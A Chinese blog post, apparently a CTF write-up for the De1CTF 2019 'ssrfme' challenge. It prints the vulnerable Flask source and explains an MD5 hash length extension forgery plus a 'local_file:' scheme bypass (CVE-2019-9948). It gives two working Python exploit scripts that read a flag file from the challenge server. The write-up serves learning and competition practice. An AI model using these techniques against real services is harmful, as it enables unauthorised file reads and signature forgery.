<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在。">
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        De1ctf - undefined
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i>  </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/" />
        </div>
        <div class="name">
            <i>Luc1fer</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>主页</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>标签</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>存档</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>关于</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>搜索</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#De1ctf-2019-WP"><span class="toc-text">De1ctf 2019 WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrfme"><span class="toc-text">ssrfme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#源码分析"><span class="toc-text">源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编写脚本"><span class="toc-text">编写脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#another-way"><span class="toc-text">another way</span></a></li></ol></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">搜索</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i>  </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        De1ctf
    </div>

    <div class="post-meta">
        <span class="attr">发布于：<span>2019-08-16 20:00:50</span></span>
        
        <span class="attr">标签：/
        
        <a class="tag" href="/tags/#ssrf" title="ssrf">ssrf</a>
        <span>/</span>
        
        <a class="tag" href="/tags/#RSA" title="RSA">RSA</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <p>这次比赛真的超有意思的！我超级喜欢的！做了半天啥都没做出来，看着那个樱花🌸全程陶醉~</p>
<a id="more"></a>
<h1 id="De1ctf-2019-WP"><a href="#De1ctf-2019-WP" class="headerlink" title="De1ctf 2019 WP"></a>De1ctf 2019 WP</h1><h2 id="ssrfme"><a href="#ssrfme" class="headerlink" title="ssrfme"></a>ssrfme</h2><p>源码 </p>
<pre><code>#! /usr/bin/env python
#encoding=utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json
reload(sys)
sys.setdefaultencoding(&apos;latin1&apos;)

app = Flask(__name__)

secert_key = os.urandom(16)


class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result[&apos;code&apos;] = 500
        if (self.checkSign()):
            if &quot;scan&quot; in self.action:
                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)
                resp = scan(self.param)
                if (resp == &quot;Connection Timeout&quot;):
                    result[&apos;data&apos;] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result[&apos;code&apos;] = 200
            if &quot;read&quot; in self.action:
                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)
                result[&apos;code&apos;] = 200
                result[&apos;data&apos;] = f.read()
            if result[&apos;code&apos;] == 500:
                result[&apos;data&apos;] = &quot;Action Error&quot;
        else:
            result[&apos;code&apos;] = 500
            result[&apos;msg&apos;] = &quot;Sign Error&quot;
        return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False


#generate Sign For Action Scan.
@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])
def geneSign():
    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
    action = &quot;scan&quot;
    return getSign(action, param)


@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])
def challenge():
    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
    ip = request.remote_addr
    if(waf(param)):
        return &quot;No Hacker!!!!&quot;
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())
@app.route(&apos;/&apos;)
def index():
    return open(&quot;code.txt&quot;,&quot;r&quot;).read()


def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return &quot;Connection Timeout&quot;



def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()


def md5(content):
    return hashlib.md5(content).hexdigest()


def waf(param):
    check=param.strip().lower()
    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
        return True
    else:
        return False


if __name__ == &apos;__main__&apos;:
    app.debug = False
    app.run(host=&apos;0.0.0.0&apos;,port=80)</code></pre><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p><code>Exec()</code>函数首先调用<code>checkSign()</code>进行md5校验，我们可以通过长度扩展攻击绕过。接下来对scan行为进行打开文本文件，调用<code>scan()</code>读取内容，然后将目标文件内容写入文件。对read行为进行刚刚写入文件的读取。</p>
<pre><code>def Exec(self):
    result = {}
    result[&apos;code&apos;] = 500
    if (self.checkSign()):
        if &quot;scan&quot; in self.action:
            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)
            resp = scan(self.param)
            if (resp == &quot;Connection Timeout&quot;):
                result[&apos;data&apos;] = resp
            else:
                print resp
                tmpfile.write(resp)
                tmpfile.close()
            result[&apos;code&apos;] = 200
        if &quot;read&quot; in self.action:
            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)
            result[&apos;code&apos;] = 200
            result[&apos;data&apos;] = f.read()
        if result[&apos;code&apos;] == 500:
            result[&apos;data&apos;] = &quot;Action Error&quot;
    else:
        result[&apos;code&apos;] = 500
        result[&apos;msg&apos;] = &quot;Sign Error&quot;
    return result

def checkSign(self):
    if (getSign(self.action, self.param) == self.sign):
        return True
    else:
        return False</code></pre><p><code>/geneSign</code>路由负责生成Sign。同时<code>action</code>被限定为<code>scan</code></p>
<pre><code>#generate Sign For Action Scan.
@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])
def geneSign():
    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
    action = &quot;scan&quot;
    return getSign(action, param)</code></pre><p><code>/De1ta</code>路由对请求的<code>param</code>参数进行检查，然后通过对<code>Task</code>类传入相应参数打印<code>Exec()</code>函数的结果</p>
<pre><code>@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])
def challenge():
    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
    ip = request.remote_addr
    if(waf(param)):
        return &quot;No Hacker!!!!&quot;
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())</code></pre><p><code>scan()</code>函数打开<code>param</code>指向的内容进行读取，这是我们利用<code>ssrf</code>的点。</p>
<pre><code>def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return &quot;Connection Timeout&quot;</code></pre><p>getSign()函数对<code>secerty_key,param,action</code>进行md5加密。</p>
<pre><code>def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()</code></pre><p>代码的逻辑大体上是</p>
<pre><code>初始化各个参数-&gt;进入Task类-&gt;执行Exec()函数-&gt;检查md5值-&gt;对参数中的action进行不同操作-&gt;dump函数执行结果</code></pre><p>我们可以通过长度扩展攻击绕过长度判断，根据提示flag在<code>/flag.txt</code>，我们可以读取这个文件，但是<code>waf()</code>对<code>gopher</code>和<code>file</code>进行过滤，我们无法利用这两个协议，根据CVE-2019-9948(urllib)<a href="https://www.cvedetails.com/cve/CVE-2019-9948/" title="CVE-2019-9948" target="_blank" rel="noopener">https://www.cvedetails.com/cve/CVE-2019-9948/</a>我们可以通过<code>local_file:///flag.txt</code>来绕过waf。</p>
<h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><pre><code>import urllib,hashpumpy 
import requests

&quot;&quot;&quot;
    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)

    Arguments:
        hexdigest(str):      Hex-encoded result of hashing key + original_data.
        original_data(str):  Known data used to get the hash result hexdigest.
        data_to_add(str):    Data to append
        key_length(int):     Length of unknown data prepended to the hash

    Returns:
        A tuple containing the new hex digest and the new message.

&quot;&quot;&quot;

url = &quot;http://139.180.128.86/&quot;

#get the Sign of Scan
geneSign = &quot;geneSign?&quot;
payload = &quot;local_file:flag.txt&quot;
re = requests.get(url+geneSign+&quot;param=&quot;+payload).text
print re

#hash extend attack
hashs,hashextend = hashpumpy.hashpump(re,payload+&quot;scan&quot;,&quot;read&quot;,16)
print hashs
action = &quot;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read&quot;
cookie = {
    #&quot;action&quot;:urllib.quote(hashextend),
    &quot;action&quot;:action,    
    &quot;sign&quot;:hashs
}
print cookie


re2 = requests.get(url+&apos;De1ta?&apos;+&quot;param=&quot;+payload,cookies=cookie)

print re2.content</code></pre><p>在使用扩展攻击的时候我们需要把所得签名前面的信息去掉</p>
<pre><code>Input Signature: 785f9921864e8704e5e44e15c8f3d6ce
Input Data: local_file:flag.txtscan
Input Key Length: 16
Input Data to Add: read
636d649a50e61e75436cc1ba50d5a003
local_file:flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\x01\x00\x00\x00\x00\x00\x00read</code></pre><h3 id="another-way"><a href="#another-way" class="headerlink" title="another way"></a>another way</h3><p>在ctf time上看到的回答，分析的好细致<a href="https://ctftime.org/writeup/16070" target="_blank" rel="noopener">https://ctftime.org/writeup/16070</a>。这里提供了另一种思路</p>
<blockquote>
<p>This will allow us to read the flag into a file, but we will not be able to read it without a valid sign with the action including “read”. If we can generate a sign for the action as “readscan”, we can perform the scan and read the result in one go.</p>
<p>Notice, geneSign() will perform an md5 hash of secret + param + action so we can pass the value of param as “flag.txtread” (the value of action will be “scan”) and generate the same hash as if we pass param as “flag.txt” and action as “readscan”.</p>
<p>“flag.txtread”+”scan” == “flag.txt”+”readscan”</p>
<p>You could also use a length extension attack, but this way is more simple.</p>
<p>So our exploit is complete.</p>
</blockquote>
<p>这是他们编写的脚本：膜</p>
<pre><code>import requests

def geneSign(param):
    return requests.get(&quot;http://139.180.128.86/geneSign?param=&quot;+param).text

realParam = &quot;flag.txt&quot;

param = realParam+&quot;read&quot;
sign = geneSign(param)
param = realParam

action = &quot;readscan&quot;

answer = requests.get(&quot;http://139.180.128.86/De1ta?param=&quot;+param, cookies={&quot;action&quot;:action,&quot;sign&quot;:sign}).text

print(answer)</code></pre>
        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "./public/search.xml"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
